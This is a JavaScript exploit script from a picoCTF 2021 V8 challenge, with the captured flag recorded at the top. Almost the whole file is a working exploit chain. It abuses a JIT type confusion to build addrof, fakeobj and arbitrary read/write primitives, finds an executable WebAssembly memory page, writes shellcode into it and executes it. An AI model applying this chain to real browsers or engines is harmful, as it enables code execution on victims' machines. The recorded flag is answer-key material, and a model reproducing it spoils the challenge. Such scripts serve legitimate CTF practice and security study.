// 135 - Download Horsepower  (Binary Exploitation, picoCTF 2021)
// Flag: academy{sh0u1d_hAv3_d0wnl0ad3d_m0r3_rAm_db0a9ebc7907f113}
// Write-up: ../../../writeups/binary-exploitation/135-168-178-v8-trio.md
// This is the script that produced the flag; historical variants are in archive/.
//
// CyLab 178 "Turboflan" - picoCTF 2021 rehost
// Based on exd0tpy's public exploit (github.com/exd0tpy/CTF-browser-challenges)
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

class c_double{
	constructor(val){ this.x = val; }
}
class c_object{
	constructor(val){ this.x = val; }
}

function getDoubleElement(obj ,idx){
	x = obj.x[idx] + 1;
	return obj.x[idx];
}
function getObjectElement(obj, idx){
	x = obj.x[idx] + 1;
	return obj.x[idx];
}
function addrof(obj){
	var addr = ftoi(getDoubleElement(new c_double([obj]), 0)) & 0xffffffffn;
	return addr;
}
function getMap(obj){
	var map = ftoi(getDoubleElement(new c_double([obj]), 0)) >> 32n;
	return map;
}
function fakeobj(addr){
	var fake = getObjectElement(new c_object([itof(addr)]), 0);
	return fake;
}
function aar64(addr){
	fake[1] = itof((2n<<32n) + BigInt(addr)-8n);
	fake[0] = itof((double_map << 32n) + double_map);
	return ftoi(oob[0]);
}
function aaw(addr, value){
	fake[1] = itof((2n<<32n) + BigInt(addr)-8n);
	fake[0] = itof((double_map << 32n) + double_map);
	oob[0] = itof(value);
}
function write_shellcode(){
	shellcode = [__SC__];
	let backingStoreAddr = addrof(target_buffer)+0x18n;
	aaw(backingStoreAddr, rwx>>32n);
	aaw(backingStoreAddr-4n, rwx);
	for(let i =0; i<shellcode.length;i++){
		dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, shellcode[i], true);
	}
}

for(let i =0;i<0x10000;i++){
	getDoubleElement(new c_double([1.1,2.2, 3.3]), 0);
	getObjectElement(new c_object([{a:1.1}]), 0);
}

var oob = [1.1, 2.2];
var object_map = getMap(oob);
var double_map = object_map-80n;
print("[+] obj map: " + object_map.toString(16) + " dbl map: " + double_map.toString(16));
var addr = addrof(oob);
print("[+] oob addr: " + addr.toString(16));
oob[0] = itof((double_map << 32n) + double_map);
oob[1] = itof((double_map<< 32n) + (addr-8n));
var fake = fakeobj(addr-0x10n);
var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(target_buffer);

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);

let wasmFunction = wasmInstance.exports.main;

let rwx = aar64(addrof(wasmInstance) + 0x67n) >> 8n;
print("[*] rwx: " + rwx.toString(16));
write_shellcode();
wasmFunction();
